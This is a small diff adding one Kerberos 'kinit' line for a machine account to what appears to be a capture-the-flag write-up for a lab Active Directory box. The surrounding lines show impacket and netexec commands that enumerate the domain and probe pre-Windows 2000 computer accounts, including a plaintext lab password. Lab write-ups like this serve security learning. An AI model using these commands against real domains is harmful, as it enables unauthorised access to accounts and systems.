@@ -159,6 +159,7 @@ impacket-lookupsid -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb
 Pre-Windows 2000 Compatible Access GROUP --> Potential Vulnerable Computer account
 
 netexec ldap MACHINE_IP -u pentest -p 'p3nt3st2025!&' -M pre2k
+kinit 'fs01$'
 ```
 
 ---
